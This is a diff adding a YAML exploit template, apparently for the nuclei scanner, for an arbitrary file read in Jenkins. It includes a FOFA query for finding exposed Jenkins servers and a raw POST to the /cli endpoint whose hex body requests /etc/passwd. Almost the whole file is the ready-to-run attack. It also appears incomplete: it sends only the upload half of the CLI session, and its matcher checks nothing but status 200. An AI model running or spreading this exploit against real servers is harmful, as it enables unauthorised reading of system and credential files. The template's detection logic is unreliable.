@@ -1,0 +1,51 @@
+id: poc-vgx2agvuvg0c0cmt
+info:
+  name: Jenkins任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vgx2agvuvg0c0cmt'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vgx2agvuvg0c0cmt
+    fofa: app:"Jenkins"
+http:
+- raw:
+  - 'POST /cli?remoting=false HTTP/1.1
+
+
+    Accept-Encoding: identity
+
+
+    Session: 44ae3a15-9ae2-4459-a3b8-e8daefe2cc53
+
+
+    Side: upload
+
+
+    Content-type: application/octet-stream
+
+
+
+
+    $<Hex>00 00 00 0E 00 00 0C 63 6F 6E 6E 65 63 74 2D 6E 6F 64 65 00 00 00 0E 00 00 0C 40 2F 65 74 63 2F 70 61 73 73 77 64 00 00 00 05 02 00 03 47 42 4B 00 00 00 07 01 00 05 7A 68 5F 43 4E 00 00 00 00 03</Hex>$
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    sbin
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
